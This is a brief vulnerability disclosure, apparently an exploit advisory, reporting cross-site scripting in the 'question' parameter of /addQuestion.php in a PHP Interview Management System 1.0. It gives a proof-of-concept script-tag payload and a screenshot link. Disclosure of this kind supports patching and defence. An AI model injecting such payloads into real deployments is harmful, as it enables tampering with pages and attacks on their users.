# Interview Management System-XSS

### Date: 2022-08/05



### Exploit Author: anx0ing@gmail.com



### Vendor Homepage: 

[https://www.sourcecodester.com](https://www.sourcecodester.com/)



### Software Link: 

https://www.sourcecodester.com/php/14585/interview-management-system-phpmysqli-full-source-code.html



### Version: 1.0



### /addQuestion.php

> `question`Parameters have Cross Site Scripting(XSS)

**payload**

```
<script>alert(1)</script>
```

![image-20220806012829053](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220806012829053.png)

